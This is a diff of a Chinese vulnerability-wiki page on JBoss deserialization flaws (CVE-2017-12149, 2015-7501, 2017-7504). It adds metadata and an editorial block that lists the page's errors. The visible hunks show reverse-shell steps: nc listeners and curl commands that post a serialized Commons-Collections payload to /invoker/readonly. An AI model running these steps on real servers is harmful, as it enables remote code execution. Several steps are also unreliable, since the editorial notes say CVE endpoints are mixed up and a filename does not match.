@@ -1,9 +1,60 @@
 ---
 version: "**漏洞原理**"
 source: "MrWQ/vulnerability-paper"
+title: "中间件常见漏洞之 JBOSS"
+product: "JBoss AS控制台/Invoker/JBossMQ"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "CVE-2017-12149; CVE-2015-7501; CVE-2017-7504"
+referenced_identifiers: ""
+identifier_role: "primary"
+cve: "CVE-2017-12149; CVE-2015-7501; CVE-2017-7504"
+affected_versions: "**漏洞原理**"
+source_url: "https://mp.weixin.qq.com/s/EZDVg8fyQ-gpumqHcv_dow"
+source_status: "recorded"
+prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。; 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
+id: "vw-c320cce235782487de90a615"
+entity_id: "ve-c320cce235782487de90a615"
+schema_version: "1"
 ---
 
 # 中间件常见漏洞之 JBOSS
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 证据范围：主要复制步骤存在跨漏洞端点错误，是多实体文档而非可直接按标题编号执行的教程。
+
+### 本次正文校订
+
+- 按实际内容修正 6 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 7501及7504发送payload都误用/invoker/readonly，实际对应12149，不能证明宣称两个CVE
+- 12149请求文件名.serx与生成.ser不符
+- EJBInvokerServlet被错说为RemoteMBeanInvocation，和前篇说明web-console/Invoker混淆
+- 弹下载/返回HTTP-IL横幅即证明可反序列化利用是错误判据，只能证明端点可达
+- Admin Console章节实际全演示JMX Console，且全版本弱口令过度泛化
+- 7501厂商暂未修复为无日期历史断言，补丁/CC版本未核；security-constraint修复缺完整XML及方法覆盖
+- 大段早期JBoss2.4架构与广告，缺一致实验版本/JRE及清理
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/EZDVg8fyQ-gpumqHcv_dow)
@@ -183,7 +234,7 @@ java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap x
 
 4.NC 开启监听：
 
-```
+```shell
 nc -vv -l -p 7777
 
 ```
@@ -192,7 +243,7 @@ nc -vv -l -p 7777
 
 向被攻击服务器发送攻击 payload：
 
-```
+```shell
 curl http://x.x.x.x:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.serx
 
 ```
@@ -275,14 +326,14 @@ java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap I
 
 新界面开启 nc 监听准备接收反弹过来的 shell
 
-```
+```shell
 nc -lvnp 监听的端口
 
 ```
 
 这个时候在工具的目录下生成了一个 ReverseShellCommonsCollectionsHashMap.ser 文件，然后我们 curl 就能反弹 shell 了
 
-```
+```shell
 curl http://目标ip:port/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
 
 ```
@@ -399,7 +450,7 @@ java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap i
 
 新开一个窗口用 nc 监听刚刚的端口
 
-```
+```shell
 nc -lnvp port
 
 ```
@@ -408,7 +459,7 @@ nc -lnvp port
 
 这个时候在这个目录下生成了一个 ReverseShellCommonsCollectionsHashMap.ser 文件，然后我们 curl 就能反弹 shell 了
 
-```
+```shell
 curl http://目标ip:port/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
 
 ```
